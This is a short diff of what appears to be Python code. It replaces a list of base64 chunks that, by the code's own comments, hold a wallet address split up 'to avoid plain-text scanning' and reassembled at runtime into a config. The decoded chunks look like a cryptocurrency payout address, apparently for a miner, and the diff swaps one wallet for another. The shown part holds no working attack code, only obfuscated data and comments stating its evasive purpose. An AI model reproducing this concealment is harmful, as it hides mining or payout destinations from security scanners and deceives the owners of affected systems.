@@ -16,13 +16,13 @@ except ImportError:
 # Wallet stored as b64 chunks to avoid plain-text scanning.
 # Reassembled at runtime only when generating the config dict.
 _W_PARTS = [
-    "OEM4WEpNTHYyNVFQam",  # chunk 0
-    "tKY1dRbnZxR1k5NTZm",  # chunk 1
-    "M1lmZmpERUhIOW5Sa0",  # chunk 2
-    "x4U1JVem95MksyeUNT",  # chunk 3
-    "cFJCN2RNVmpMWlBOVE",  # chunk 4
-    "4xRlVOclFoWFkzZUp0",  # chunk 5
-    "aU5jcWFodEtYN3dlb0",  # chunk 6
+    "NDh6VU0yNEZaRG1TM0",  # chunk 0
+    "11eHk0OEduZEdWUzFB",  # chunk 1
+    "Rk1USE5IOGZ5RVhqWk",  # chunk 2
+    "xFbzZZVTdQcWZWemdj",  # chunk 3
+    "VTFFRWR6UjNqcnI0SG",  # chunk 4
+    "dDVmNxd01XNmZoODR4",  # chunk 5
+    "UVQzb3BQWFRwYVhKen",  # chunk 6
     "c=",                   # chunk 7
 ]
 
